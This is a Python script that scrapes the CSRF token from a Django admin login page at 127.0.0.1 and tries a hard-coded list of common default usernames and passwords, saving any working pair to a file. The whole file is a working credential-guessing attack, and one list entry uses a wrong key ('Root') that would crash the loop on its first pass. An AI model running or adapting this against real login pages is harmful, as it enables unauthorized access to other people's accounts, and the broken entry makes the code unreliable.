import requests
from bs4 import BeautifulSoup

# Start a session to handle cookies
session = requests.Session()

# Get the login page to extract CSRF token
login_url = "http://127.0.0.1:8000/admin/login/"
response = session.get(login_url)

# Parse the page to get CSRF token
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
print(f"CSRF Token: {csrf_token}")

# Try login with common credentials
credentials_list = [
    {"username": "admin", "Root": "root"},
    {"username": "admin", "password": "password123"},
    {"username": "administrator", "password": "administrator"},
    {"username": "root", "password": "root"},
    {"username": "django", "password": "django"},
    {"username": "admin", "password": "django123"},
    {"username": "admin", "password": "letmein"},
]

for creds in credentials_list:
    print(f"\nTrying: {creds['username']}:{creds['password']}")
    
    login_data = {
        'username': creds['username'],
        'password': creds['password'],
        'csrfmiddlewaretoken': csrf_token,
        'next': '/admin/'
    }
    
    response = session.post(login_url, data=login_data)
    
    if response.status_code == 200:
        if "Please enter the correct" in response.text:
            print("  Failed: Incorrect credentials")
        else:
            print("  SUCCESS! Logged in!")
            # Save successful session
            with open('successful_login.txt', 'w') as f:
                f.write(f"Username: {creds['username']}\nPassword: {creds['password']}\n")
            break
    else:
        print(f"  Error: Status code {response.status_code}")
